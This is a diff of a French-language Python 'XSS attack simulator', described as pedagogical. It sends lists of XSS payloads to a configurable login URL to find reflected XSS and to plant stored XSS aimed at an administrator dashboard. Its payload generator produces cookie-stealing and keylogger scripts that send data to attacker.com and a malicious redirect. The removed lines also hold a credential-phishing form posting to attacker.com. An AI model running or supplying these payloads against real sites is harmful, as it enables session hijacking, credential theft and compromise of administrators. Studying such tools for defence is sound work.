@@ -1,306 +1,236 @@
 #!/usr/bin/env python3
 """
-Attaque XSS (Cross-Site Scripting)
-Injection de scripts malveillants dans les champs
+Attaque XSS améliorée
+Avec support Ngrok et analyse détaillée
 """
 
 import requests
 from colorama import Fore, Style, init
-from bs4 import BeautifulSoup
+from config import get_target_url, load_config
 
 init(autoreset=True)
 
-TARGET_URL = "http://localhost/login"
+XSS_PAYLOADS = [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg/onload=alert('XSS')>",
+    "<iframe src='javascript:alert(1)'>",
+    "<body onload=alert('XSS')>",
+    "<input onfocus=alert('XSS') autofocus>",
+    "javascript:alert('XSS')",
+    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
+    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
+]
 
 
 def banner():
     print(f"""
 {Fore.YELLOW}╔═══════════════════════════════════════════════════╗
-║         🕷️  XSS ATTACK SIMULATOR                 ║
+║         🕷️  XSS ATTACK SIMULATOR v2.0            ║
 ║              POUR TESTS PÉDAGOGIQUES              ║
 ╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}
 """)
 
 
-XSS_PAYLOADS = [
-    # XSS basiques
-    "<script>alert('XSS')</script>",
-    "<script>alert(document.cookie)</script>",
-    "<img src=x onerror=alert('XSS')>",
-    "<svg/onload=alert('XSS')>",
-    "<body onload=alert('XSS')>",
+class XSSAnalyzer:
+    """Analyse les résultats XSS"""
     
-    # XSS avancés
-    "<iframe src='javascript:alert(1)'>",
-    "<input onfocus=alert('XSS') autofocus>",
-    "<select onfocus=alert('XSS') autofocus>",
-    "<textarea onfocus=alert('XSS') autofocus>",
-    "<marquee onstart=alert('XSS')>",
+    def __init__(self):
+        self.total_tests = 0
+        self.reflected_xss = []
+        self.stored_attempts = []
+        self.safe_payloads = []
     
-    # Encodage
-    "<script>alert(String.fromCharCode(88,83,83))</script>",
-    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
+    def add_reflected_test(self, payload, reflected):
+        """Ajoute un test XSS reflété"""
+        self.total_tests += 1
+        if reflected:
+            self.reflected_xss.append(payload)
+        else:
+            self.safe_payloads.append(payload)
     
-    # Event handlers
-    "<div onmouseover='alert(1)'>hover me</div>",
-    "<a href='javascript:alert(1)'>click</a>",
+    def add_stored_test(self, payload):
+        """Ajoute une tentative XSS stocké"""
+        self.stored_attempts.append(payload)
     
-    # Polyglot
-    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
-    
-    # Bypass filters
-    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
-    "<ScRiPt>alert('XSS')</ScRiPt>",
-    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
-]
+    def print_summary(self):
+        """Affiche le résumé"""
+        print(f"\n{Fore.CYAN}╔═══════════════ RAPPORT XSS ═══════════════╗{Style.RESET_ALL}")
+        
+        print(f"\n{Fore.WHITE}📊 TESTS REFLÉTÉS:{Style.RESET_ALL}")
+        print(f"  • Payloads testés: {self.total_tests}")
+        print(f"  • XSS détectés: {Fore.RED}{len(self.reflected_xss)}{Style.RESET_ALL}")
+        print(f"  • Filtrés: {Fore.GREEN}{len(self.safe_payloads)}{Style.RESET_ALL}")
+        
+        if self.reflected_xss:
+            print(f"\n{Fore.RED}⚠️  VULNÉRABILITÉS XSS REFLÉTÉES:{Style.RESET_ALL}")
+            for i, payload in enumerate(self.reflected_xss[:5], 1):
+                print(f"  {i}. {payload[:60]}...")
+        
+        if self.stored_attempts:
+            print(f"\n{Fore.YELLOW}💾 XSS STOCKÉS (tentatives):{Style.RESET_ALL}")
+            print(f"  • Payloads envoyés: {len(self.stored_attempts)}")
+            print(f"  • Vérifiez le dashboard pour confirmer l'exécution")
+        
+        # Analyse de sécurité
+        print(f"\n{Fore.CYAN}🔐 ANALYSE DE SÉCURITÉ:{Style.RESET_ALL}")
+        
+        if len(self.reflected_xss) > 0:
+            print(f"  {Fore.RED}⚠️  VULNÉRABLE À XSS REFLÉTÉ{Style.RESET_ALL}")
+            print(f"  {Fore.RED}   → {len(self.reflected_xss)} payload(s) fonctionnel(s){Style.RESET_ALL}")
+            print(f"\n  {Fore.YELLOW}Recommandations:{Style.RESET_ALL}")
+            print(f"    • Encoder toutes les sorties HTML")
+            print(f"    • Utiliser textContent au lieu de innerHTML")
+            print(f"    • Implémenter Content Security Policy (CSP)")
+            print(f"    • Sanitiser tous les inputs utilisateur")
+        else:
+            print(f"  {Fore.GREEN}✓ XSS REFLÉTÉ FILTRÉ{Style.RESET_ALL}")
 
 
-def test_reflected_xss():
-    """Teste XSS reflété dans les messages d'erreur"""
+def test_reflected_xss(url):
+    """Teste XSS reflété"""
     print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
     print(f"║          🔍 TEST XSS REFLÉTÉ                     ║")
     print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
     
-    print(f"{Fore.WHITE}Test: Injection dans les champs username/password{Style.RESET_ALL}\n")
+    analyzer = XSSAnalyzer()
     
-    vulnerabilities_found = []
-    
-    for i, payload in enumerate(XSS_PAYLOADS[:10], 1):  # Limiter pour la démo
-        print(f"{Fore.CYAN}[{i}/10] Test payload: {payload[:50]}...{Style.RESET_ALL}")
+    for i, payload in enumerate(XSS_PAYLOADS, 1):
+        print(f"{Fore.CYAN}[{i}/{len(XSS_PAYLOADS)}] Test: {payload[:50]}...{Style.RESET_ALL}")
         
         try:
-            # Test dans username
             response = requests.post(
-                TARGET_URL,
+                url,
                 json={"username": payload, "password": "test"},
-                timeout=5
+                timeout=10
             )
             
-            # Vérifier si le payload est reflété dans la réponse
+            # Vérifier si le payload est reflété
             if payload in response.text:
-                print(f"{Fore.RED}    [!] VULNÉRABILITÉ XSS REFLÉTÉE DÉTECTÉE !{Style.RESET_ALL}")
-                print(f"{Fore.RED}    [!] Le payload est reflété sans sanitisation{Style.RESET_ALL}")
-                vulnerabilities_found.append({
-                    'type': 'Reflected XSS',
-                    'field': 'username',
-                    'payload': payload
-                })
+                print(f"{Fore.RED}    [!] VULNÉRABLE - Payload reflété !{Style.RESET_ALL}")
+                analyzer.add_reflected_test(payload, True)
             else:
-                print(f"{Fore.GREEN}    [✓] Payload filtré ou non reflété{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}    [✓] Filtré{Style.RESET_ALL}")
+                analyzer.add_reflected_test(payload, False)
         
         except Exception as e:
             print(f"{Fore.YELLOW}    [!] Erreur: {str(e)}{Style.RESET_ALL}")
     
-    # Rapport
-    print(f"\n{Fore.CYAN}═══════════════ RÉSULTAT ═══════════════{Style.RESET_ALL}")
-    if vulnerabilities_found:
-        print(f"{Fore.RED}[!] {len(vulnerabilities_found)} vulnérabilité(s) XSS détectée(s){Style.RESET_ALL}")
-        for vuln in vulnerabilities_found:
-            print(f"  • {vuln['type']} dans '{vuln['field']}'")
-    else:
-        print(f"{Fore.GREEN}[✓] Aucune vulnérabilité XSS reflétée détectée{Style.RESET_ALL}")
+    analyzer.print_summary()
+    return analyzer
 
 
-def test_stored_xss():
-    """Teste XSS stocké (si les données sont sauvegardées)"""
+def test_stored_xss(url):
+    """Teste XSS stocké"""
     print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
     print(f"║          💾 TEST XSS STOCKÉ                      ║")
     print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
     
-    print(f"{Fore.WHITE}Principe: Tenter de stocker un payload XSS dans MongoDB")
-    print(f"qui sera exécuté quand un autre utilisateur consultera les données{Style.RESET_ALL}\n")
+    print(f"{Fore.WHITE}Principe:{Style.RESET_ALL}")
+    print("  Injecter des payloads XSS qui seront stockés dans MongoDB")
+    print("  et exécutés quand un admin consulte le dashboard\n")
     
-    payload = "<script>alert('XSS Stocké !')</script>"
+    analyzer = XSSAnalyzer()
     
-    print(f"{Fore.CYAN}[*] Injection du payload: {payload}{Style.RESET_ALL}")
-    
-    try:
-        # Tenter de créer un utilisateur avec XSS
-        response = requests.post(
-            TARGET_URL,
-            json={"username": payload, "password": "test123"},
-            timeout=5
-        )
-        
-        print(f"{Fore.GREEN}[✓] Payload envoyé au serveur{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}[!] Si le payload est stocké dans MongoDB sans sanitisation,")
-        print(f"[!] il sera exécuté lors de l'affichage sur le dashboard{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.WHITE}Pour vérifier:")
-        print(f"1. Connectez-vous au dashboard")
-        print(f"2. Consultez la table 'users'")
-        print(f"3. Si une alerte JavaScript s'affiche = XSS stocké réussi !{Style.RESET_ALL}")
-    
-    except Exception as e:
-        print(f"{Fore.RED}[✗] Erreur: {str(e)}{Style.RESET_ALL}")
-
-
-def test_dom_xss():
-    """Teste XSS basé sur le DOM"""
-    print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
-    print(f"║          🌐 TEST XSS BASÉ SUR LE DOM             ║")
-    print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
-    
-    print(f"{Fore.WHITE}Principe: Exploiter le JavaScript côté client{Style.RESET_ALL}\n")
-    
-    dom_payloads = [
-        "http://localhost/?redirect=javascript:alert('XSS')",
-        "http://localhost/#<script>alert('XSS')</script>",
-        "http://localhost/?name=<img src=x onerror=alert('XSS')>",
+    dangerous_payloads = [
+        "<script>alert('XSS Stocké !')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "<svg/onload=alert(document.cookie)>"
     ]
     
-    for payload in dom_payloads:
-        print(f"{Fore.CYAN}[*] Test URL: {payload}{Style.RESET_ALL}")
+    for i, payload in enumerate(dangerous_payloads, 1):
+        print(f"{Fore.CYAN}[{i}/{len(dangerous_payloads)}] Injection: {payload}{Style.RESET_ALL}")
+        
         try:
-            response = requests.get(payload, timeout=5)
-            print(f"{Fore.GREEN}    [✓] URL accessible{Style.RESET_ALL}")
-        except:
-            print(f"{Fore.YELLOW}    [!] Erreur d'accès{Style.RESET_ALL}")
+            response = requests.post(
+                url,
+                json={"username": payload, "password": "xss_test"},
+                timeout=10
+            )
+            
+            print(f"{Fore.GREEN}    [✓] Payload envoyé au serveur{Style.RESET_ALL}")
+            analyzer.add_stored_test(payload)
+            
+        except Exception as e:
+            print(f"{Fore.RED}    [✗] Erreur: {str(e)}{Style.RESET_ALL}")
+    
+    print(f"\n{Fore.YELLOW}[!] Pour vérifier:{Style.RESET_ALL}")
+    print("  1. Connectez-vous au dashboard en tant qu'administrateur")
+    print("  2. Consultez la table 'users'")
+    print("  3. Si une alerte JavaScript s'affiche = XSS stocké réussi !")
+    
+    analyzer.print_summary()
+    return analyzer
 
 
-def create_xss_payload_generator():
-    """Générateur de payloads XSS personnalisés"""
+def generate_xss_payload():
+    """Générateur de payloads XSS"""
     print(f"\n{Fore.CYAN}╔═══════════════════════════════════════════════════╗")
     print(f"║        🛠️  GÉNÉRATEUR DE PAYLOADS XSS            ║")
     print(f"╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
     
-    print(f"{Fore.WHITE}Choisissez le type de payload:")
+    print(f"{Fore.WHITE}Type de payload:")
     print("1. Alert simple")
     print("2. Vol de cookies")
-    print("3. Redirection malveillante")
+    print("3. Redirection")
     print("4. Keylogger")
-    print("5. Phishing (faux formulaire){Style.RESET_ALL}\n")
+    print("5. Défacement{Style.RESET_ALL}\n")
     
-    choice = input(f"{Fore.CYAN}Votre choix (1-5): {Style.RESET_ALL}")
+    choice = input(f"{Fore.CYAN}Choix (1-5): {Style.RESET_ALL}")
     
     payloads = {
         "1": "<script>alert('XSS Test')</script>",
-        "2": "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
-        "3": "<script>window.location='http://malicious-site.com'</script>",
-        "4": "<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}</script>",
-        "5": """<script>
-document.body.innerHTML='<h1>Session expirée</h1><form action=\"http://attacker.com/phish\" method=\"post\"><input name=\"user\" placeholder=\"Username\"><input name=\"pass\" type=\"password\" placeholder=\"Password\"><button>Connexion</button></form>';
-</script>"""
+        "2": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
+        "3": "<script>window.location='https://malicious-site.com'</script>",
+        "4": "<script>document.onkeypress=e=>fetch('https://attacker.com/log?k='+e.key)</script>",
+        "5": "<script>document.body.innerHTML='<h1>HACKED</h1>'</script>"
     }
     
     if choice in payloads:
         print(f"\n{Fore.GREEN}[✓] Payload généré:{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}{payloads[choice]}{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}{payloads[choice]}{Style.RESET_ALL}\n")
         
-        test = input(f"\n{Fore.CYAN}Tester ce payload ? (o/n): {Style.RESET_ALL}")
-        if test.lower() == 'o':
-            try:
-                response = requests.post(
-                    TARGET_URL,
-                    json={"username": payloads[choice], "password": "test"},
-                    timeout=5
-                )
-                print(f"{Fore.GREEN}[✓] Payload envoyé au serveur{Style.RESET_ALL}")
-            except Exception as e:
-                print(f"{Fore.RED}[✗] Erreur: {str(e)}{Style.RESET_ALL}")
-
-
-def explain_xss():
-    """Explique la vulnérabilité XSS"""
-    print(f"""
-{Fore.CYAN}╔═══════════════════════════════════════════════════╗
-║          📚 EXPLICATION DE L'ATTAQUE XSS         ║
-╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}
-
-{Fore.WHITE}🔍 Qu'est-ce qu'une attaque XSS ?
-
-XSS = Cross-Site Scripting
-Injection de scripts malveillants qui s'exécutent dans le navigateur
-des autres utilisateurs.
-
-📋 Types de XSS :
-
-1. {Fore.YELLOW}XSS Reflété{Fore.WHITE}
-   Le payload est immédiatement reflété dans la réponse
-   Ex: Message d'erreur contenant l'input utilisateur
-
-2. {Fore.YELLOW}XSS Stocké{Fore.WHITE} (le plus dangereux)
-   Le payload est sauvegardé en base de données
-   Ex: Commentaire avec <script> stocké dans MongoDB
-   → S'exécute pour TOUS les utilisateurs qui consultent
-
-3. {Fore.YELLOW}XSS DOM-based{Fore.WHITE}
-   Exploite le JavaScript côté client
-   Ex: URL avec paramètre injecté dans le DOM
-
-🎯 Pourquoi votre application est vulnérable ?
-
-1. {Fore.RED}Pas de sanitisation des inputs{Fore.WHITE}
-   Les données utilisateur ne sont pas nettoyées
-
-2. {Fore.RED}Stockage direct dans MongoDB{Fore.WHITE}
-   Les payloads XSS sont sauvegardés tels quels
-
-3. {Fore.RED}Affichage sans échappement dans le dashboard{Fore.WHITE}
-   dashboard.html affiche les données sans innerHTML protection
-
-💥 Impacts possibles :
-
-• Vol de session (cookies)
-• Redirection vers sites malveillants
-• Keylogging (enregistrement des touches)
-• Défacement (modification de la page)
-• Phishing (faux formulaires)
-• Propagation de malware
-
-🛡️ Comment se protéger ?
-
-1. {Fore.GREEN}Sanitiser TOUTES les entrées utilisateur{Fore.WHITE}
-   → Utiliser DOMPurify, bleach, etc.
-
-2. {Fore.GREEN}Encoder les sorties{Fore.WHITE}
-   → textContent au lieu de innerHTML
-   → Jinja2 autoescaping en Python
-
-3. {Fore.GREEN}Content Security Policy (CSP){Fore.WHITE}
-   → Header HTTP interdisant scripts inline
-
-4. {Fore.GREEN}Validation stricte côté serveur{Fore.WHITE}
-   → Whitelist de caractères autorisés
-
-5. {Fore.GREEN}HTTPOnly cookies{Fore.WHITE}
-   → Empêche JavaScript d'accéder aux cookies
-
-Exemple de correction dans dashboard.html:
-{Fore.RED}❌ element.innerHTML = userData{Fore.WHITE}
-{Fore.GREEN}✓ element.textContent = userData{Style.RESET_ALL}
-    """)
+        print(f"{Fore.WHITE}Variantes:{Style.RESET_ALL}")
+        print(f"  IMG: <img src=x onerror=\"{payloads[choice][8:-9]}\">")
+        print(f"  SVG: <svg/onload=\"{payloads[choice][8:-9]}\">")
+    else:
+        print(f"{Fore.RED}[✗] Choix invalide{Style.RESET_ALL}")
 
 
 def main():
     banner()
     
-    print(f"{Fore.WHITE}Sélectionnez le type de test XSS:")
-    print("1. XSS Reflété (dans les réponses)")
-    print("2. XSS Stocké (dans MongoDB)")
-    print("3. XSS DOM-based")
-    print("4. Générateur de payloads XSS")
-    print("5. Tous les tests")
-    print("6. Explication de la vulnérabilité")
-    print("7. Quitter{Style.RESET_ALL}\n")
+    # Charger ou demander la configuration
+    config = load_config()
+    if not config:
+        print(f"{Fore.YELLOW}[!] Aucune configuration trouvée{Style.RESET_ALL}")
+        config = get_target_url()
     
-    choice = input(f"{Fore.CYAN}Votre choix (1-7): {Style.RESET_ALL}")
+    TARGET_URL = config['login_endpoint']
+    
+    print(f"\n{Fore.GREEN}[✓] Cible configurée: {TARGET_URL}{Style.RESET_ALL}")
+    
+    print(f"""
+{Fore.WHITE}Sélectionnez le type de test XSS:
+1. XSS Reflété
+2. XSS Stocké
+3. Générateur de payloads
+4. Tous les tests
+5. Quitter{Style.RESET_ALL}
+""")
+    
+    choice = input(f"{Fore.CYAN}Votre choix (1-5): {Style.RESET_ALL}")
     
     if choice == "1":
-        test_reflected_xss()
+        test_reflected_xss(TARGET_URL)
     elif choice == "2":
-        test_stored_xss()
+        test_stored_xss(TARGET_URL)
     elif choice == "3":
-        test_dom_xss()
+        generate_xss_payload()
     elif choice == "4":
-        create_xss_payload_generator()
+        test_reflected_xss(TARGET_URL)
+        test_stored_xss(TARGET_URL)
     elif choice == "5":
-        test_reflected_xss()
-        test_stored_xss()
-        test_dom_xss()
-    elif choice == "6":
-        explain_xss()
-    elif choice == "7":
         print(f"{Fore.CYAN}[*] Au revoir !{Style.RESET_ALL}")
     else:
         print(f"{Fore.RED}[✗] Choix invalide{Style.RESET_ALL}")
